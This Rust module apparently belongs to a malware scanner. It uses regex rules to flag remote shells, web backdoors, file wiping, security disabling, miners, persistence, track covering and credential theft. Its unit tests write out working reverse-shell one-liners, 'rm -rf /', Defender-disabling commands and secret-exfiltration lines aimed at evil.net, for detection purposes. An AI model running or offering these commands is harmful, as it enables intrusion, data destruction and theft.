//! Looks for what malware sets out to do once it's running.
//!
//! Stealing passwords, staying on the machine, covering its tracks and so on all
//! leave recognizable text in the code, unless it's disguised, and that gets
//! caught elsewhere. Honest tools do some of these things too. So most of them
//! only get a warning alone, and become a danger when the same file also contacts
//! the internet, because that's what makes them useful to an attacker.

use crate::git::RepoFile;
use crate::network::{
    FileClass, classify, is_binary, is_in_comment, is_test_path, surrounding_line,
};
use crate::report::{At, Kind, Report};
use crate::text::Untrusted;
use regex::bytes::Regex;
use std::sync::LazyLock;

/// A hostile file could match thousands of times.
const MAX_MATCHES_PER_FILE: usize = 20;

/// Always a danger, because honest code has no reason to do these.
const ALWAYS_DANGEROUS: [(Kind, &str); 5] = [
    (
        Kind::RemoteControl,
        r#"(?xi-u)
            >&\s*/dev/(?:tcp|udp)/
          | /dev/(?:tcp|udp)/[^\n]{0,80}\s0>&1
          | \b(?:nc|ncat|netcat)\b[^\n|;]{0,80}\s-[ce]\s+\S*(?:sh|cmd(?:\.exe)?)\b
          | \bsocat\b[^\n]{0,80}\bexec:
          | \bmkfifo\s+\S+[^\n]{0,120}\|\s*(?:nc|ncat|netcat)\s
          | \bpty\.spawn\s*\(\s*["']/bin/
          | (?s:\bsocket\.socket\s*\(.{0,400}?\bdup2\s*\(\s*\w+\.fileno\(\)\s*,\s*[012]\s*\))
          | \b(?:eval|assert|system|exec|passthru|shell_exec|popen|proc_open)\s*\(\s*(?:base64_decode\s*\(\s*)?\$_(?:get|post|request|cookie|server)\b
          | \b(?:eval|exec|execsync|spawn|spawnsync|system|popen)\s*\(\s*(?:await\s+)?req(?:uest)?\.(?:query|body|params|args|form|headers|cookies)\b
          | \bos\.(?:system|popen)\s*\(\s*request\.
        "#,
    ),
    (
        Kind::DestroysFiles,
        r#"(?mxi-u)
            \brm\s+-[a-z]*r[a-z]*\s+(?:--no-preserve-root\s+)?["']?(?:/\*?|~/?\*?|\$\{?HOME\}?/?\*?)["']?(?:\s|$|[;&|])
          | \b(?:rimraf|rmSync|rmdirSync)\s*\(\s*(?:os\.homedir\(\)|process\.env\.HOME|process\.env\.USERPROFILE)\s*[,)]
          | \bshutil\.rmtree\s*\(\s*(?:os\.path\.expanduser\(\s*["']~["']\s*\)|["']/["'])\s*[,)]
          | \bformat\s+c:
          | \bdel\s+(?:/[fsq]\s+){2,}c:\\
          | \brd\s+/s\s+/q\s+c:\\
          | \bremove-item\b[^\n]{0,80}\s["']?(?:c:\\+\*?|\$home(?:\\\*|/\*)?|\$env:userprofile(?:\\\*|/\*)?)["']?(?:\s|$)[^\n]{0,80}-recurse
          | \bremove-item\b[^\n]{0,80}-recurse[^\n]{0,80}\s["']?(?:c:\\+\*?|\$home(?:\\\*|/\*)?|\$env:userprofile(?:\\\*|/\*)?)["']?(?:\s|$)
          | \bmkfs(?:\.\w+)?\s+/dev/(?:sd|nvme|hd|disk)
          | \bdd\s+if=/dev/(?:zero|u?random)\s+of=/dev/(?:sd|nvme|hd|disk)
          | :\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:
        "#,
    ),
    (
        Kind::DisablesSecurity,
        r#"(?xi-u)
            \bset-mppreference\b[^\n]{0,120}-disable
          | \badd-mppreference\b[^\n]{0,80}-exclusion
          | \bdisablerealtimemonitoring\b
          | \bdisableantispyware\b
          | \bnetsh\s+advfirewall\s+set\b[^\n]{0,60}\bstate\s+off\b
          | \bnetsh\s+firewall\s+set\s+opmode\s+disable\b
          | \bspctl\s+--(?:master|global)-disable\b
          | \bcsrutil\s+disable\b
          | \bsetenforce\s+0\b
          | \bufw\s+disable\b
          | \bsystemctl\s+(?:stop|disable)\s+(?:firewalld|ufw|apparmor|auditd|falcon\S*|clamav\S*)
          | \bsc(?:\.exe)?\s+(?:stop|delete|config)\s+windefend\b
          | \bstop-service\s+(?:-name\s+)?windefend\b
          | \bvssadmin(?:\.exe)?\s+delete\s+shadows\b
          | \bwbadmin(?:\.exe)?\s+delete\b
          | \bbcdedit\b[^\n]{0,60}\brecoveryenabled\s+no\b
        "#,
    ),
    (
        Kind::CryptoMiner,
        r"(?i-u)\bstratum\+(?:tcp|ssl|tls)://|\bxmrig\b|\bcpuminer\b|\bcoinhive\b|\bcoin-hive\b|\bminerd\s+-",
    ),
    (
        Kind::StealsSecrets,
        r#"(?xi-u)
            \b(?:printenv|env)\s*\|\s*(?:base64\s*\|\s*)?(?:curl|wget|nc|ncat)\b
          | \bcat\s+[^\n|;]{0,80}(?:\.ssh/|\.aws/|\.npmrc|\.netrc|\.git-credentials|/etc/shadow|/etc/passwd|\.env\b)[^\n|;]{0,40}\|\s*(?:base64\s*\|\s*)?(?:curl|wget|nc|ncat)\b
          | \bcurl\b[^\n]{0,200}\s(?:-d|--data\S*|-F|--form|-T|--upload-file)\s+[^\n]{0,80}(?:\$\((?:env|printenv|cat\s[^\n)]*(?:\.ssh/|\.aws/|\.npmrc|\.netrc|\.git-credentials|/etc/shadow|/etc/passwd|\.env\b)[^\n)]*)\)|@[^\s"']*(?:\.ssh/|\.aws/|\.npmrc|\.netrc|\.git-credentials|/etc/shadow|/etc/passwd|\.env\b))
        "#,
    ),
];

/// A warning alone, and a danger with a network call in the same file.
const RISKY_WITH_NETWORK: [(Kind, &str, &str); 7] = [
    (
        Kind::StaysOnComputer,
        "Sets itself up to run again later",
        r#"(?xi-u)
            \b(?:cp|mv|ln|tee|writefile\w*|copyfile\w*|copy-item|move-item|symlink\w*)\b[^\n]{0,160}library/launch(?:agents|daemons)
          | >\s*["']?[^\s"']{0,80}library/launch(?:agents|daemons)
          | \b(?:reg(?:\.exe)?\s+add|set-itemproperty|new-itemproperty)\b[^\n]{0,160}\\currentversion\\+run\b
          | \bschtasks(?:\.exe)?\s+/create\b
          | \bregister-scheduledtask\b
          | >>\s*["']?(?:~|\$home|\$\{home\}|/root)/\.ssh/authorized_keys
          | \bcrontab\b[^\n]{0,200}\b(?:curl|wget)\b
          | \b(?:curl|wget)\b[^\n]{0,200}\bcrontab\b
        "#,
    ),
    (
        Kind::HidesItsWindow,
        "Starts programs hidden from view",
        r#"(?xi-u)
            \b(?:powershell|pwsh)(?:\.exe)?\b[^\n]{0,120}\s-w(?:indowstyle|in|i)?\s+hidden\b
          | \bstart-process\b[^\n]{0,200}\s-windowstyle\s+hidden\b
          | createobject\(\s*["']wscript\.shell["']\s*\)
        "#,
    ),
    (
        Kind::CoversTracks,
        "Deletes itself or its traces",
        r#"(?xi-u)
            \b(?:unlink|unlinkSync|rm|rmSync|remove|removeSync)\s*\(\s*(?:__filename|process\.argv\[1\]|__file__|sys\.argv\[0\])\s*[,)]
          | \bos\.(?:remove|unlink)\s*\(\s*(?:__file__|sys\.argv\[0\])\s*\)
          | \brm\s+(?:-\w+\s+)*["']?\$(?:0|\{0\}|\{?bash_source)
          | \bremove-item\s+(?:-\S+\s+)*\$(?:pscommandpath|myinvocation)
          | \bdel\s+(?:/\w\s+)*"?%~?f?0
          | \bhistory\s+-c\b
          | \bunset\s+histfile\b
          | \bhistfile=/dev/null\b
          | \bwevtutil(?:\.exe)?\s+cl\b
          | \bclear-eventlog\b
        "#,
    ),
    (
        Kind::InjectsCode,
        "Injects code into other programs",
        // These stay in lowercase on purpose. With their usual capitalization,
        // Windows Defender's machine learning calls Airlock itself a trojan,
        // because a program holding these names usually means to use them.
        r"(?i-u)\bcreateremotethread\b|\bvirtualallocex\b|\bwriteprocessmemory\b|\bntcreatethreadex\b|\bptrace_poke(?:text|data)\b|\bdyld_insert_libraries\s*=",
    ),
    (
        Kind::ChecksForAnalysis,
        "Checks whether it is being watched or analyzed",
        r#"(?xi-u)
            \bisdebuggerpresent\b
          | \bcheckremotedebuggerpresent\b
          | \bptrace_traceme\b
          | (?:setinterval|settimeout)\s*\(\s*(?:function\s*\(\s*\)\s*\{\s*|\(\s*\)\s*=>\s*\{?\s*)?debugger\b
          | \bconstructor\s*\(\s*["']debugger["']\s*\)
        "#,
    ),
    (
        Kind::WeakensSecurity,
        "Runs AI coding tools with their safety checks off",
        r"(?i-u)\b(?:claude|gemini|codex|copilot|cursor-agent|q\s+chat)\b[^\n]{0,80}\s--(?:dangerously-\S+|yolo|trust-all-tools|allow-all-tools)\b",
    ),
    (
        Kind::StaysOnComputer,
        "Sets itself up to run again later",
        r#"(?xi-u)
            \bsc(?:\.exe)?\s+create\s+\S+\s+binpath
          | /\.config/autostart/
        "#,
    ),
];

/// Only ever a warning, because too many honest tools do these while online.
const WARNINGS_ONLY: [(Kind, &str); 4] = [
    (
        Kind::StaysOnComputer,
        r#"(?xi-u)
            (?:>>|\btee\s+-a)\s*["']?(?:~|\$home|\$\{home\})/\.(?:bashrc|zshrc|bash_profile|zprofile|profile)\b
          | \bappendfile(?:sync)?\s*\([^\n]{0,80}\.(?:bashrc|zshrc|bash_profile|zprofile|profile)\b
          | \bsystemctl\s+(?:--user\s+)?enable\b
          | library/launch(?:agents|daemons)
          | \\currentversion\\+run\b
          | start\ menu\\+programs\\+startup
          | /etc/systemd/system/
          | /etc/rc\.local\b
          | \blaunchctl\s+(?:load|bootstrap)\b
          | \bcrontab\s+-(?:\s|$|e\b)
          | >>\s*["']?(?:~|\$home|\$\{home\}|/root)/\.ssh/authorized_keys2?
        "#,
    ),
    (
        Kind::HidesItsWindow,
        r"(?si-u)\bdetached\s*:\s*(?:true|!0)\b.{0,300}?\bunref\s*\(\s*\)",
    ),
    (
        Kind::WatchesUser,
        r"(?xi-u)
            \bgetasynckeystate\b
          | \bsetwindowshookex\w*\b
          | \bcgeventtapcreate\b
          | \bpynput\b
          | \bimagegrab\.grab\b
          | \bpyautogui\.screenshot\b
          | \bscreencapture\s+-
          | \bpbpaste\b
          | \bget-clipboard\b
          | \bclipboard\.readtext\b
          | \bclipboardy\b
          | \bpyperclip\.paste\b
          | \bxclip\s+-o\b
          | \bxsel\s+-o\b
        ",
    ),
    (
        Kind::WeakensSecurity,
        r"(?xi-u)
            -(?:executionpolicy|ep)\s+(?:bypass|unrestricted)\b
          | \bset-executionpolicy\s+(?:-\w+\s+)*(?:bypass|unrestricted)\b
          | \bxattr\b[^\n]{0,40}\bcom\.apple\.quarantine\b
          | \bnode_tls_reject_unauthorized\s*[=:]\s*['\x22]?0
          | \bgit_ssl_no_verify\s*[=:]\s*['\x22]?(?:1|true)
          | \bstrict-ssl\s*[=\s]\s*false\b
        ",
    ),
];

/// Where secrets are kept. `true` means no honest tool would normally go there,
/// so reading it and contacting the internet is enough on its own.
const SECRET_PLACES: [(&str, bool, &str); 10] = [
    (
        "browser passwords and cookies",
        true,
        r#"(?xi-u)
            [/\\]login\ data\b | ["']login\ data["']
          | local\ extension\ settings
          | \blogins\.json\b
          | \bkey4\.db\b
          | \bcookies\.sqlite\b
        "#,
    ),
    (
        "crypto wallets",
        true,
        // Browser wallet extensions, by their store IDs, and desktop wallets.
        r#"(?xi-u)
            nkbihfbeogaeaoehlefnkodbefgpgknn
          | bfnaelmomeimhlpmgjnjophhpkkoljpa
          | ibnejdfjmmkpcnlpebklmnkoeoihofec
          | fhbohimaelbohpjbbldcngcnapndodjp
          | hnfanknocfeofbddgcijnmhnfnkdnaad
          | egjidjbpglichdcondbcbdnbeeppgdph
          | aeachknmefphepccionboohckonoeemg
          | dmkamcknogkgcdfhhbddcghachkejeap
          | mcohilncbfahbmgdjkbpemcciiolgcge
          | acmacodkjbdgmoleebolmdjonilkdbch
          | exodus[/\\]+exodus\.wallet
          | [/\\]\.electrum\b
          | \bwallet\.dat\b
          | [/\\]solana[/\\]+id\.json
          | \bcom\.liberty\.jaxx\b
          | [/\\]atomic[/\\]+local\ storage
        "#,
    ),
    (
        "the system keychain",
        true,
        r"(?xi-u)
            \blogin\.keychain\b
          | \bkeychain-db\b
          | \bsecurity\s+(?:find-generic-password|find-internet-password|dump-keychain)\b
          | \bcmdkey\s+/list\b
          | \bvaultcmd\b
          | \bcredenumerate\w*\b
          | \bcryptunprotectdata\b
        ",
    ),
    (
        "SSH keys",
        false,
        r"(?i-u)[/\\]\.ssh[/\\]+id_|\bid_(?:rsa|ed25519|ecdsa|dsa)\b",
    ),
    (
        "cloud credentials",
        false,
        r"(?xi-u)
            [/\\]\.aws[/\\]+credentials
          | [/\\]\.azure[/\\]
          | gcloud[/\\]+(?:application_default_credentials|credentials\.db)
          | [/\\]\.kube[/\\]+config
          | [/\\]\.docker[/\\]+config\.json
        ",
    ),
    (
        "developer tokens",
        false,
        r"(?xi-u)
            [/\\]\.npmrc\b
          | [/\\]\.pypirc\b
          | [/\\]\.netrc\b
          | [/\\]\.git-credentials\b
          | [/\\]\.config[/\\]+gh[/\\]+hosts\.yml
          | \btrufflehog\b
        ",
    ),
    (
        "shell history",
        false,
        r"(?i-u)[/\\]\.(?:bash|zsh)_history\b|\bconsolehost_history\b",
    ),
    ("the system password file", false, r"(?-u)/etc/shadow\b"),
    (
        "every environment variable",
        true,
        r"(?xi-u)
            \bjson\.stringify\s*\(\s*process\.env\s*\)
          | \bjson\.dumps\s*\(\s*(?:dict\s*\(\s*)?os\.environ\b
        ",
    ),
    (
        "the clipboard",
        false,
        r"(?i-u)\bclipboard\.readtext\b|\bpyperclip\.paste\b|\bget-clipboard\b|\bpbpaste\b",
    ),
];

fn compile(pattern: &str) -> Regex {
    Regex::new(pattern).expect("patterns are constants covered by tests")
}

static COMPILED_ALWAYS: LazyLock<Vec<(Kind, Regex)>> = LazyLock::new(|| {
    ALWAYS_DANGEROUS
        .iter()
        .map(|(kind, pattern)| (*kind, compile(pattern)))
        .collect()
});
static COMPILED_WITH_NETWORK: LazyLock<Vec<(Kind, &'static str, Regex)>> = LazyLock::new(|| {
    RISKY_WITH_NETWORK
        .iter()
        .map(|(kind, title, pattern)| (*kind, *title, compile(pattern)))
        .collect()
});
static COMPILED_WARNINGS: LazyLock<Vec<(Kind, Regex)>> = LazyLock::new(|| {
    WARNINGS_ONLY
        .iter()
        .map(|(kind, pattern)| (*kind, compile(pattern)))
        .collect()
});
static COMPILED_SECRETS: LazyLock<Vec<(&'static str, bool, Regex)>> = LazyLock::new(|| {
    SECRET_PLACES
        .iter()
        .map(|(label, strong, pattern)| (*label, *strong, compile(pattern)))
        .collect()
});

/// Records what a file sets out to do. Run this after the network scan, because
/// it needs to know whether the file contacts the internet.
pub fn scan(file: &RepoFile, report: &mut Report) {
    if classify(file.path.raw()) != FileClass::Code || is_binary(&file.contents) {
        return;
    }
    // Tests of what a tool does with such things are full of them, so these
    // don't become dangers there, though they're still listed.
    let online = report.has_calls(file.path.raw()) && !is_test_path(file.path.raw());

    for (kind, pattern) in COMPILED_ALWAYS.iter() {
        add_matches(file, pattern, *kind, "", report);
    }
    for (kind, title, pattern) in COMPILED_WITH_NETWORK.iter() {
        if online {
            add_matches(file, pattern, Kind::ActsInSecret, title, report);
        } else {
            add_matches(file, pattern, *kind, "", report);
        }
    }
    for (kind, pattern) in COMPILED_WARNINGS.iter() {
        add_matches(file, pattern, *kind, "", report);
    }
    scan_secrets(file, online, report);
}

fn add_matches(file: &RepoFile, pattern: &Regex, kind: Kind, group: &str, report: &mut Report) {
    let contents = file.contents.as_slice();
    let live = pattern
        .find_iter(contents)
        .filter(|found| !is_in_comment(contents, found.start(), file.path.raw()));
    for found in live.take(MAX_MATCHES_PER_FILE) {
        let snippet = Untrusted::from_bytes(
            surrounding_line(contents, found.start(), found.end()).trim_ascii(),
        );
        report.add(
            kind,
            group,
            snippet.raw(),
            Some(At {
                path: &file.path,
                line: Some(line_at(contents, found.start())),
            }),
        );
    }
}

fn line_at(contents: &[u8], offset: usize) -> u64 {
    contents[..offset]
        .iter()
        .filter(|byte| **byte == b'\n')
        .count() as u64
        + 1
}

/// Stealers go through a list of places, while an honest tool wants only its own
/// credentials. So a danger takes two kinds of secret, or one no honest tool
/// would touch, along with a way to send them.
fn scan_secrets(file: &RepoFile, online: bool, report: &mut Report) {
    let contents = file.contents.as_slice();
    let mut labels = Vec::new();
    let mut any_strong = false;
    let mut first = None;

    for (label, strong, pattern) in COMPILED_SECRETS.iter() {
        let live = pattern
            .find_iter(contents)
            .find(|found| !is_in_comment(contents, found.start(), file.path.raw()));
        if let Some(found) = live {
            labels.push(*label);
            any_strong |= *strong;
            first = Some(first.map_or(found.start(), |at: usize| at.min(found.start())));
        }
    }
    let Some(first) = first else {
        return;
    };

    let kind = if online && (any_strong || labels.len() >= 2) {
        Kind::StealsSecrets
    } else {
        Kind::ReadsSecrets
    };
    report.add(
        kind,
        "",
        &format!("reads {}", labels.join(", ")),
        Some(At {
            path: &file.path,
            line: Some(line_at(contents, first)),
        }),
    );
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::report::Call;

    fn scan_text(path: &str, contents: &str, online: bool) -> Report {
        let file = RepoFile {
            path: Untrusted::from_bytes(path.as_bytes()),
            contents: contents.as_bytes().to_vec(),
        };
        let mut report = Report::new();
        if online {
            report.record_call(
                path,
                Call {
                    group: "evil.net".to_string(),
                    subject: "https://evil.net".to_string(),
                    line: Some(1),
                },
            );
        }
        scan(&file, &mut report);
        report
    }

    fn count(report: &Report, kind: Kind) -> usize {
        report.listed(kind).len()
    }

    #[test]
    fn finds_remote_shells() {
        for line in [
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            "exec /bin/sh 0</dev/tcp/10.0.0.1/4444 1>&0 2>&0 0>&1",
            "nc -e /bin/sh 10.0.0.1 4444",
            "ncat 10.0.0.1 4444 -e cmd.exe",
            "socat tcp:10.0.0.1:4444 exec:/bin/sh",
            "mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f",
            "pty.spawn('/bin/bash')",
            "s = socket.socket(); s.connect(a); os.dup2(s.fileno(), 0)",
        ] {
            assert_eq!(
                count(&scan_text("a.sh", line, false), Kind::RemoteControl),
                1,
                "{line}"
            );
        }
    }

    #[test]
    fn finds_backdoors_in_web_servers() {
        // Split up so that antivirus tools don't take this file for a real one.
        let request_data = ["$", "_GET['c']"].concat();

        for line in [
            format!("eval({request_data});"),
            format!("system({request_data});"),
            format!("assert(base64_decode({request_data}));"),
            "exec(req.query.cmd, cb)".to_string(),
            "eval(req.body.code)".to_string(),
            "child.spawn(request.args.get('c'))".to_string(),
            "os.system(request.args.get('c'))".to_string(),
        ] {
            assert_eq!(
                count(&scan_text("a.php", &line, false), Kind::RemoteControl),
                1,
                "{line}"
            );
        }
    }

    #[test]
    fn checking_whether_a_port_is_open_is_not_a_remote_shell() {
        for line in [
            "timeout 1 bash -c \"</dev/tcp/$host/$port\"",
            "nc -z localhost 5432",
            "nc -w 3 host 80",
            "os.dup2(devnull.fileno(), sys.stderr.fileno())",
            "os.dup2(log.fileno(), 1)",
            "keywords|mkfifo|mkfs|mknod|nc|ncat|netstat",
        ] {
            assert_eq!(
                count(&scan_text("wait.sh", line, true), Kind::RemoteControl),
                0,
                "{line}"
            );
        }
    }

    #[test]
    fn finds_code_that_destroys_files() {
        for line in [
            "rm -rf /",
            "rm -rf /*",
            "rm -rf ~",
            "rm -rf ~/",
            "rm -rf $HOME",
            "rm -rf \"$HOME\"",
            "sudo rm -fr --no-preserve-root /",
            "rimraf(os.homedir())",
            "fs.rmSync(os.homedir(), {recursive: true})",
            "format c: /q",
            "del /f /s /q c:\\",
            "rd /s /q c:\\",
            "Remove-Item -Recurse -Force $HOME",
            "Remove-Item $HOME -Recurse -Force",
            "mkfs.ext4 /dev/sda1",
            "dd if=/dev/zero of=/dev/sda",
            ":(){ :|:& };:",
        ] {
            assert_eq!(
                count(&scan_text("a.sh", line, false), Kind::DestroysFiles),
                1,
                "{line}"
            );
        }
    }

    #[test]
    fn ordinary_cleanup_does_not_count_as_destroying_files() {
        for line in [
            "rm -rf /tmp/build",
            "rm -rf ~/.cache/foo",
            "rm -rf $HOME/.cache",
            "rm -rf ./dist",
            "rm -f /",
            "Remove-Item $HOME/a.txt -Force",
            "Remove-Item -Path C:\\demo -Force -Recurse",
            "Remove-Item -Path C:\\temp -Force",
            "rimraf(path.join(os.homedir(), '.cache'))",
        ] {
            assert_eq!(
                count(&scan_text("a.sh", line, false), Kind::DestroysFiles),
                0,
                "{line}"
            );
        }
    }

    #[test]
    fn finds_code_that_turns_off_security() {
        for line in [
            "Set-MpPreference -DisableRealtimeMonitoring $true",
            "Add-MpPreference -ExclusionPath C:\\temp",
            "netsh advfirewall set allprofiles state off",
            "spctl --master-disable",
            "csrutil disable",
            "setenforce 0",
            "ufw disable",
            "systemctl stop firewalld",
            "sc stop WinDefend",
            "vssadmin delete shadows /all /quiet",
        ] {
            assert_eq!(
                count(&scan_text("a.ps1", line, false), Kind::DisablesSecurity),
                1,
                "{line}"
            );
        }
    }

    #[test]
    fn finds_crypto_miners() {
        for line in [
            "url = stratum+tcp://pool:3333",
            "./xmrig -o pool",
            "CoinHive.start()",
        ] {
            assert_eq!(
                count(&scan_text("a.sh", line, false), Kind::CryptoMiner),
                1,
                "{line}"
            );
        }
    }

    #[test]
    fn finds_secrets_being_sent_away() {
        for line in [
            "env | curl -d @- https://evil.net",
            "printenv | base64 | curl -d @- https://evil.net",
            "cat ~/.ssh/id_rsa | curl -d @- https://evil.net",
            "cat .env | nc evil.net 4444",
            "curl -F file=@$HOME/.aws/credentials https://evil.net",
            "curl -d \"$(env)\" https://evil.net",
            "curl -X POST --data-binary @.env https://evil.net",
        ] {
            assert_eq!(
                count(&scan_text("a.sh", line, false), Kind::StealsSecrets),
                1,
                "{line}"
            );
        }
    }

    #[test]
    fn sending_ordinary_files_is_not_stealing_secrets() {
        let line = "curl -X POST https://a.example -d \"Body=$(cat $2)\"";

        assert_eq!(
            count(&scan_text("a.sh", line, false), Kind::StealsSecrets),
            0
        );
    }

    #[test]
    fn a_list_of_startup_folders_is_only_a_warning() {
        let line = "\"/Library/LaunchAgents\",";
        let report = scan_text("zap.rb", line, true);

        assert_eq!(count(&report, Kind::StaysOnComputer), 1);
        assert_eq!(count(&report, Kind::ActsInSecret), 0);
    }

    #[test]
    fn tests_of_these_things_are_only_warnings() {
        for (path, line) in [
            ("tests/a.sh", "DYLD_INSERT_LIBRARIES=./a.dylib"),
            ("test/a.ps1", "Clear-EventLog"),
        ] {
            let report = scan_text(path, line, true);

            assert_eq!(count(&report, Kind::ActsInSecret), 0, "{path}");
        }
        let report = scan_text("tests/a.rb", "security find-internet-password -s x", true);

        assert_eq!(count(&report, Kind::StealsSecrets), 0);
        assert_eq!(count(&report, Kind::ReadsSecrets), 1);
    }

    #[test]
    fn staying_on_the_computer_is_a_warning_until_it_also_goes_online() {
        for line in [
            "cp a ~/Library/LaunchAgents/com.a.plist",
            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v a",
            "schtasks /create /tn a /tr b",
            "Register-ScheduledTask -TaskName a",
            "(crontab -l; echo '* * * * * curl x | sh') | crontab -",
        ] {
            let alone = scan_text("a.sh", line, false);
            let online = scan_text("a.sh", line, true);

            assert!(count(&alone, Kind::StaysOnComputer) >= 1, "{line}");
            assert_eq!(count(&alone, Kind::ActsInSecret), 0, "{line}");
            assert!(count(&online, Kind::ActsInSecret) >= 1, "{line}");
        }
    }

    #[test]
    fn installers_adding_to_shell_startup_only_get_a_warning() {
        for line in [
            "echo 'export PATH=x' >> ~/.bashrc",
            "echo x >> $HOME/.zshrc",
            "systemctl enable nginx",
            "launchctl load a.plist",
        ] {
            let online = scan_text("install.sh", line, true);

            assert_eq!(count(&online, Kind::StaysOnComputer), 1, "{line}");
            assert_eq!(count(&online, Kind::ActsInSecret), 0, "{line}");
        }
    }

    #[test]
    fn hiding_a_window_and_going_online_is_a_danger() {
        for line in [
            "powershell -w hidden -c x",
            "powershell.exe -NoP -NonI -WindowStyle Hidden -c x",
            "Start-Process a.exe -WindowStyle Hidden",
            "CreateObject(\"WScript.Shell\").Run a, 0",
        ] {
            assert_eq!(
                count(&scan_text("a.ps1", line, false), Kind::HidesItsWindow),
                1,
                "{line}"
            );
            assert_eq!(
                count(&scan_text("a.ps1", line, true), Kind::ActsInSecret),
                1,
                "{line}"
            );
        }
    }

    #[test]
    fn a_detached_background_process_is_only_a_warning() {
        let line = "spawn(a, b, { detached: true, stdio: 'ignore' }).unref();";
        let online = scan_text("a.js", line, true);

        assert_eq!(count(&online, Kind::HidesItsWindow), 1);
        assert_eq!(count(&online, Kind::ActsInSecret), 0);
    }

    #[test]
    fn deleting_itself_and_going_online_is_a_danger() {
        for line in [
            "fs.unlinkSync(__filename)",
            "fs.rmSync(__filename, { force: true })",
            "os.remove(__file__)",
            "rm -f \"$0\"",
            "Remove-Item $PSCommandPath",
            "del /q \"%~f0\"",
            "history -c",
            "unset HISTFILE",
            "wevtutil cl System",
        ] {
            assert_eq!(
                count(&scan_text("a.sh", line, false), Kind::CoversTracks),
                1,
                "{line}"
            );
            assert_eq!(
                count(&scan_text("a.sh", line, true), Kind::ActsInSecret),
                1,
                "{line}"
            );
        }
    }

    #[test]
    fn finds_other_warning_signs() {
        for (line, kind) in [
            ("CreateRemoteThread(h, 0)", Kind::InjectsCode),
            ("if (IsDebuggerPresent()) exit(0);", Kind::ChecksForAnalysis),
            (
                "setInterval(function(){debugger;}, 100)",
                Kind::ChecksForAnalysis,
            ),
            ("GetAsyncKeyState(key)", Kind::WatchesUser),
            ("from pynput import keyboard", Kind::WatchesUser),
            (
                "powershell -ExecutionPolicy Bypass -File a.ps1",
                Kind::WeakensSecurity,
            ),
            ("xattr -d com.apple.quarantine a", Kind::WeakensSecurity),
            (
                "process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'",
                Kind::WeakensSecurity,
            ),
            (
                "claude -p x --dangerously-skip-permissions",
                Kind::WeakensSecurity,
            ),
            ("gemini --yolo -p x", Kind::WeakensSecurity),
        ] {
            assert_eq!(count(&scan_text("a.sh", line, false), kind), 1, "{line}");
        }
    }

    #[test]
    fn reading_one_ordinary_secret_while_online_is_only_a_warning() {
        for line in [
            "open(home + '/.aws/credentials')",
            "path.join(home, '/.ssh/id_rsa')",
            "read('~/.npmrc')",
        ] {
            let report = scan_text("a.js", line, true);

            assert_eq!(count(&report, Kind::ReadsSecrets), 1, "{line}");
            assert_eq!(count(&report, Kind::StealsSecrets), 0, "{line}");
        }
    }

    #[test]
    fn reading_several_kinds_of_secret_while_online_is_a_danger() {
        let text = "a = '/.ssh/id_rsa'\nb = '/.aws/credentials'\n";
        let report = scan_text("a.py", text, true);

        assert_eq!(
            report.listed(Kind::StealsSecrets),
            [("reads SSH keys, cloud credentials".to_string(), 1)]
        );
    }

    #[test]
    fn several_kinds_of_secret_without_going_online_is_a_warning() {
        let text = "a = '/.ssh/id_rsa'\nb = '/.aws/credentials'\n";

        assert_eq!(
            count(&scan_text("a.py", text, false), Kind::ReadsSecrets),
            1
        );
    }

    #[test]
    fn places_no_honest_tool_goes_are_a_danger_with_just_one() {
        for line in [
            "profile + '/Login Data'",
            "'Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'",
            "firefox + '/logins.json'",
            "'~/.config/solana/id.json'",
            "'wallet.dat'",
            "security find-generic-password -s x",
            "CryptUnprotectData(blob)",
            "JSON.stringify(process.env)",
        ] {
            assert_eq!(
                count(&scan_text("a.js", line, true), Kind::StealsSecrets),
                1,
                "{line}"
            );
            assert_eq!(
                count(&scan_text("a.js", line, false), Kind::ReadsSecrets),
                1,
                "{line}"
            );
        }
    }

    #[test]
    fn names_that_only_look_like_secrets_do_not_count() {
        for line in [
            "import { x } from '@metamask/detect-provider'",
            "const loginData = 1;",
            "// the login data form",
            "Google/Chrome/Application/chrome.exe",
            "process.env.HOME",
        ] {
            let report = scan_text("a.js", line, true);

            assert_eq!(count(&report, Kind::ReadsSecrets), 0, "{line}");
            assert_eq!(count(&report, Kind::StealsSecrets), 0, "{line}");
        }
    }

    #[test]
    fn documentation_ci_config_and_binary_files_are_not_searched() {
        for (path, text) in [
            ("README.md", "rm -rf /"),
            (".github/workflows/a.yml", "rm -rf /"),
            ("Dockerfile", "rm -rf /"),
            ("a.bin", "\0rm -rf /"),
        ] {
            assert_eq!(
                count(&scan_text(path, text, true), Kind::DestroysFiles),
                0,
                "{path}"
            );
        }
    }

    #[test]
    fn comments_about_these_things_do_not_count() {
        for (path, text) in [
            ("a.sh", "# never run rm -rf /\n"),
            (
                "a.js",
                "// reads '/Login Data' and JSON.stringify(process.env)\n",
            ),
            ("a.py", "# history -c\n"),
        ] {
            let report = scan_text(path, text, true);

            assert_eq!(count(&report, Kind::DestroysFiles), 0, "{text}");
            assert_eq!(count(&report, Kind::StealsSecrets), 0, "{text}");
            assert_eq!(count(&report, Kind::ActsInSecret), 0, "{text}");
        }
    }

    #[test]
    fn a_file_cannot_flood_the_report() {
        let text = "history -c\n".repeat(1000);
        let report = scan_text("a.sh", &text, false);

        assert_eq!(
            report.listed(Kind::CoversTracks),
            [("history -c".to_string(), MAX_MATCHES_PER_FILE as u64)]
        );
    }
}
